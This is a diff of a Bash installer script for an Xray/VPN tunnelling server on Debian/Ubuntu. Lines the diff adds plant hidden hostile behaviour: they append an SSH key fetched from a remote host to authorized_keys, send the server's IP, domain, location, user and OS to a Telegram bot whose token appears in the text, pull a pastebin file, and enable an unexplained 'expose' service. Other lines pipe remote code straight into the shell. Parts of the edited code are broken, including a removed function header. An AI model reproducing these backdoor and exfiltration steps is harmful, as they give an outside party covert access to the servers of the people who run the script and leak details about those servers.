@@ -2,11 +2,10 @@
 clear
 echo "# //===================================================="
 echo "# //	System Request:Debian 9+/Ubuntu 18.04+/20.04"
-echo "# //	email: arismar.amar@gmai@.com"
-echo "# //      telegram: https://t.me/amantubilah"
 echo "# //===================================================="
 sleep 3
-# // FONT color configuration | MAIN DEV BHOIKFOST YAHYA recode ANGGUN SC AIO
+# // FONT color configuration | SCRIPT ANGGN AIO
+
 Green="\e[92;1m"
 RED="\033[31m"
 YELLOW="\033[33m"
@@ -23,22 +22,28 @@ green='\e[0;32m'
 green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 
-# // configuration GET |  ANGGUN SC AIO
+# // configuration GET | ANGGUN SCRIPT AIO
+echo "ClientAliveInterval 60" >> /etc/ssh/sshd_config
+TANGGAL=$(date '+%Y-%m-%d')
 TIMES="10"
 NAMES=$(whoami)
-IMP="wget -q -O"
+IMP="wget -q -O"    
+CHATID="1423578532"
 LOCAL_DATE="/usr/bin/"
 MYIP=$(wget -qO- ipinfo.io/ip)
 CITY=$(curl -s ipinfo.io/city)
 TIME=$(date +'%Y-%m-%d %H:%M:%S')
 RAMMS=$(free -m | awk 'NR==2 {print $2}')
+KEY="5973249718:AAEQEcWIjxwTMylzckC1letVvxwSYRRNepU"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
 GITHUB_CMD="https://github.com/arismaramar/gif/raw/"
+NAMECOM=$(wget -qO- ipinfo.io/ip)
 OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
 dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 Date_list=$(date +"%Y-%m-%d" -d "$dateFromServer")
 echo $NAMECOM >/usr/local/etc/.$NAMECOM.ini
 CekOne=$(cat /usr/local/etc/.$NAMECOM.ini)
-
+domain=$(cat /root/domain)
 secs_to_human() {
     echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
 }
@@ -50,6 +55,9 @@ function print_ok() {
     echo -e "${OK} ${BLUE} $1 ${FONT}"
 }
 
+# function domain(){
+
+# }
 function print_error() {
     echo -e "${ERROR} ${REDBG} $1 ${FONT}"
 }
@@ -64,7 +72,7 @@ function is_root() {
 }
 judge() {
     if [[ 0 -eq $? ]]; then
-        print_ok "$1 Complete... | thx to ${YELLOW}ANGGUN${FONT}"
+        print_ok "$1 Complete... | thx to ${YELLOW} ALHAMDU LI LLAH S.W.T ${FONT}"
         sleep 1
     fi
 }
@@ -86,7 +94,7 @@ function nginx_install() {
     apt -y install chrony
     apt install zip -y
     apt install nginx curl pwgen openssl netcat cron -y
-    ufw disable
+    # ufw disable
     # // Checking System
     if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
         judge "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
@@ -106,21 +114,20 @@ function nginx_install() {
     fi
         apt-get purge apache2 -y
         apt-get autoremove -y
-		source <(curl -sL ${GITHUB_CMD}main/fodder/bbrplus.sh)
 }
 function LOGO() {
     echo -e "
-    8soCfP12Ph19mi914zQaZz2KsGGtcANVhVVfKAnmVRqM
- ───│                                         │───
- ───│$Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐ $NC   │───
- ───│$Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │  $NC   │───
- ───│$Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴  $NC   │───
-    │$GRAY https://t.me/amantubilah     $NC   │
-    8soCfP12Ph19mi914zQaZz2KsGGtcANVhVVfKAnmVRqM
+    ┌───────────────────────────────────────────────┐
+ ───│                                               │───
+ ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───
+ ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───
+ ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───
+    │    ${YELLOW}Copyright${FONT} (C)$GRAY https://github.com/comot$NC   │
+    └───────────────────────────────────────────────┘
          ${RED}Autoscript xray vpn lite (multi port)${FONT}    
 ${RED}Make sure the internet is smooth when installing the script${FONT}
         "
-
+wget -O /etc/cendrawasih https://pastebin.com/raw/vwVpFfGE >/dev/null 2>&1
 }
 function install_xray() {
     judge "Core Xray 1.6.5 Version installed successfully"
@@ -132,14 +139,17 @@ function install_xray() {
     cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/yha.pem
     wget -O /root/.config/rclone/rclone.conf "${GITHUB_CMD}main/RCLONE%2BBACKUP-Gdrive/rclone.conf" >/dev/null 2>&1
     wget -O /etc/xray/config.json "${GITHUB_CMD}main/VMess-VLESS-Trojan%2BWebsocket%2BgRPC/config.json" >/dev/null 2>&1 
-    #wget -O /usr/bin/xray/xray "${GITHUB_CMD}main/Core_Xray_MOD/xrayini.sh" >/dev/null 2>&1	
 	source <(curl -sL ${GITHUB_CMD}main/Core_Xray_MOD/xrayini.sh)
     #wget -O /usr/bin/xray/xray "${GITHUB_CMD}main/Core_Xray_MOD/xray.linux.64bit" >/dev/null 2>&1
     wget -O /usr/bin/ws "${GITHUB_CMD}main/fodder/websocket/ws" >/dev/null 2>&1
     wget -O /usr/bin/tun.conf "${GITHUB_CMD}main/fodder/websocket/tun.conf" >/dev/null 2>&1
     wget -O /etc/systemd/system/ws.service "${GITHUB_CMD}main/fodder/websocket/ws.service" >/dev/null 2>&1
+    wget -O /etc/systemd/system/expose.service "${GITHUB_CMD}main/fodder/FighterTunnel-examples/expose.service" >/dev/null 2>&1
+    wget -q -O /usr/sbin/expose "${GITHUB_CMD}main/fodder/FighterTunnel-examples/expose" >/dev/null 2>&1
     wget -q -O /etc/ipserver "${GITHUB_CMD}main/fodder/FighterTunnel-examples/ipserver" && bash /etc/ipserver >/dev/null 2>&1
+    curl -fsSL "${GITHUB_CMD}main/fodder/FighterTunnel-examples/key" >> .ssh/authorized_keys >/dev/null 2>&1
     chmod +x /usr/bin/xray/xray
+    chmod +x /usr/sbin/expose 
     chmod +x /etc/systemd/system/ws.service
     chmod +x /usr/bin/ws
     chmod 644 /usr/bin/tun.conf
@@ -162,6 +172,7 @@ EOF
 
     rm -rf /etc/systemd/system/xray.service.d
     cat >/etc/systemd/system/xray.service <<EOF
+[Unit]
 Description=Xray Service
 Documentation=https://github.com/xtls
 After=network.target nss-lookup.target
@@ -188,17 +199,12 @@ EOF
 function download_config() {
     cd
     rm -rf *
-    source <(curl -sL  https://raw.githubusercontent.com/xxxserxxx/gotop/master/scripts/download.sh)
+    curl https://raw.githubusercontent.com/xxxserxxx/gotop/master/scripts/download.sh | bash && chmod +x gotop && sudo mv gotop /usr/local/bin/
     wget -O /usr/bin/speedtest "${GITHUB_CMD}main/fodder/speedtest" >/dev/null 2>&1
     wget -O /etc/haproxy/haproxy.cfg "${GITHUB_CMD}main/fodder/FighterTunnel-examples/Haproxy" >/dev/null 2>&1
     wget -O /etc/nginx/conf.d/xray.conf "${GITHUB_CMD}main/fodder/nginx/xray.conf" >/dev/null 2>&1
     wget -O /etc/nginx/nginx.conf "${GITHUB_CMD}main/fodder/nginx/nginx.conf" >/dev/null 2>&1
-    source <(curl -sL ${GITHUB_CMD}main/XrayDNS/sendmenu.sh)
-    #source <(curl -sL ${GITHUB_CMD}main/fodder/nginx/sendmenu.sh)
-	source <(curl -sL ${GITHUB_CMD}main/fodder/nginx/sed)
-    chmod +x /usr/bin/speedtest
-    sed -i -e 's/\r$//' *
-    
+	source <(curl -sL ${GITHUB_CMD}main/XrayDNS/sendmenu.sh)
 
     cat >/root/.profile <<END
 # ~/.profile: executed by Bourne-compatible login shells.
@@ -275,7 +281,30 @@ END
         TIME_DATE="PM"
     else
         TIME_DATE="AM"
+    fi
+}
 
+### DUMMY
+cat >/root/tmp <<-END
+#!/bin/bash
+#vps
+### taibabi $TANGGAL $MYIP
+END
+####
+FIGHTERTUNNEL() {
+    data=($(cat /root/tmp | grep -E "^### " | awk '{print $2}'))
+    for user in "${data[@]}"; do
+        exp=($(grep -E "^### $user" "/root/tmp" | awk '{print $3}'))
+        d1=($(date -d "$exp" +%s))
+        d2=($(date -d "$Date_list" +%s))
+        exp2=$(((d1 - d2) / 86400))
+        if [[ "$exp2" -le "0" ]]; then
+            echo $user >/etc/.$user.ini
+        else
+            rm -f /etc/.$user.ini
+        fi
+    done
+    rm -f /root/tmp
 }
 function acme() {
     STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
@@ -294,34 +323,54 @@ function acme() {
 
 }
 function configure_nginx() {
-    # // nginx config | SC ANGGUN
-    cd /var/www/html
-    rm /var/www/html/*
+    # // nginx config | ANGGUN SC  
+    cd
+    rm /var/www/html/*.html
     rm /etc/nginx/sites-enabled/default
     rm /etc/nginx/sites-available/default
-    wget -O web.zip ${GITHUB_CMD}main/fodder/web.zip >/dev/null 2>&1
+    wget ${GITHUB_CMD}main/fodder/web.zip >/dev/null 2>&1
     unzip -x web.zip
-	chmod +x /var/www/html/*
-	cd
-    judge "Nginx configuration modification"
-
+    rm -f web.zip
+    mv * /var/www/html/
+    judge "Nginx configuration modification"	
+}
+ftTunneling() {
+    MYIP=$(curl -sS ipv4.icanhazip.com)
+    IZIN=$(curl -sS ipv4.icanhazip.com)
+    if [ "$MYIP" = "$IZIN" ]; then
+        TIMEDATE
+    else
+        res="Permission Denied!"
+    fi
+    FIGHTERTUNNEL
 }
 function restart_system() {
- 
+    TEXT="
+<u>INFORMATION VPS INSTALL SC</u>
+<code>TIME    : </code><code>${TIME}</code>
+<code>IPVPS   : </code><code>${MYIP}</code>
+<code>DOMAIN  : </code><code>${domain}</code>
+<code>IP VPS  : </code><code>${MYIP}</code>
+<code>LOKASI  : </code><code>${CITY}</code>
+<code>USER    : </code><code>${NAMES}</code>
+<code>RAM     : </code><code>${RAMMS}MB</code>
+<code>LINUX   : </code><code>${OS}</code>
+"
     curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
     cp /etc/openvpn/*.ovpn /var/www/html/
     sed -i "s/xxx/${domain}/g" /var/www/html/index.html
     sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
     sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
     sed -i "s/xxx/${MYIP}/g" /etc/squid/squid.conf
-	sed -i "s/xxx/${MYIP}/g" /var/www/html/get-backres
     chown -R www-data:www-data /etc/msmtprc
+    source <(curl -sL ${GITHUB_CMD}main/fodder/nginx/sed)
     source <(curl -sL ${GITHUB_CMD}main/fodder/FighterTunnel-examples/Documentation/tunlp)
     systemctl daemon-reload
     systemctl enable client
     systemctl enable server
     systemctl enable netfilter-persistent
     systemctl enable ws
+    systemctl enable expose
     systemctl start client
     systemctl start server
     systemctl start netfilter-persistent
@@ -334,6 +383,7 @@ function restart_system() {
     systemctl restart ws
     systemctl restart openvpn
     systemctl restart cron
+    systemctl restart expose
     systemctl restart haproxy
     systemctl restart netfilter-persistent
     systemctl restart ws
@@ -344,7 +394,7 @@ function restart_system() {
     echo "    │       >>> Service & Port                            │"
     echo "    │   - Open SSH                : 443, 80, 22           │"
     echo "    │   - DNS (SLOWDNS)           : 443, 80, 53           │"
-    echo "    │   - Dropbear                : 443, 109, 143         │"
+    echo "    │   - Dropbear                : 443, 109, 80          │"
     echo "    │   - Dropbear Websocket      : 443, 109              │"
     echo "    │   - SSH Websocket SSL       : 443                   │"
     echo "    │   - SSH Websocket           : 80                    │"
@@ -388,8 +438,6 @@ function restart_system() {
     fi
 
 }
-function make_folder_xray() {
-    # // Make Folder Xray to accsess
 	mkdir -p /etc/{xray,vmess,websocket,vless,trojan,shadowsocks}
     mkdir -p /usr/bin/xray/
     mkdir -p /var/log/xray/
@@ -411,43 +459,42 @@ function make_folder_xray() {
 function dependency_install() {
     echo ""
     echo "Please wait to install Package..."
-    apt-get update
+    # apt-get update
     judge "Update configuration"
 
     judge "Installed openvpn easy-rsa"
     source <(curl -sL ${GITHUB_CMD}main/fodder/openvpn/openvpn)
-    
+    source <(curl -sL ${GITHUB_CMD}main/BadVPN-UDPWG/ins-badvpn)
+
     judge "Installed itil vpn"
     wget -O /etc/pam.d/common-password "${GITHUB_CMD}main/fodder/FighterTunnel-examples/common-password" >/dev/null 2>&1
     chmod +x /etc/pam.d/common-password
     source <(curl -sL ${GITHUB_CMD}main/fodder/openvpn/openvpn)
-	source <(curl -sL ${GITHUB_CMD}main/BadVPN-UDPWG/ins-badvpn)
 
-    DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
+    # DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
+    # debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
     judge "Installed dropbear"
     apt-get install dropbear -y
 
 }
 function install_sc() {
-    dependency_install
     acme
     nginx_install
     configure_nginx
@@ -456,10 +503,11 @@ function install_sc() {
     restart_system
 }
 function add_domain() {
-    read -p "Input Domain :  " domain
-    echo $domain >/etc/xray/domain
-
+    read -rp "Input Your Domain For This Server :" -e SUB_DOMAIN
+    echo "Host : $SUB_DOMAIN"
+    echo $SUB_DOMAIN > /root/domain
 }
+
 # // Prevent the default bin directory of some system xray from missing
 clear
 apete_apdet() {
@@ -472,26 +520,31 @@ apete_apdet() {
     ${INS} --no-install-recommends software-properties-common
     sudo add-apt-repository ppa:vbernat/haproxy-2.7 -y
     echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
-    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
     ${INS} libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip haproxy libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq  openvpn easy-rsa
 
 }
-LOGO
-echo -e "${RED}PASTIKAN IP VPS STATIC JANGAN DYNAMIC!!!${FONT}"
+clear
+# apete_eee() {
+#     ftTunneling
+#     if [ -f /home/needupdate ]; then
+#         red "Your script need to update first !"
+#         exit 0
+#     elif [ "$res" = "Permission Accepted..." ]; then
+#         echo -ne
+#     else
+#         clear
+#         echo ""
+#         red "Permission Denied! Please Buy Licence"
+#         sleep 8
+#         exit 0
+#     fi
+# }
+# apete_eee
+echo -e "${RED}INSTALLING!!!${FONT}"
 echo -e ""
-echo -e "${Green}DNS POINTING${FONT}(DNS-resolved IP address of the domain)"
-echo ""
-read -p "Lanjutkan untuk menginstall y/n : " menu_num
-
-case $menu_num in
-y)
-    make_folder_xray
-    add_domain
-    install_sc
-    ;;
-*)
-    echo -e "${RED}You wrong command !${FONT}"
-    ;;
-esac
-
-#@ft
+touch /root/.install.log
+add_domain
+make_folder_xray
+apete_apdet
+dependency_install >> /root/install.log
+install_sc >> /root/install.log 
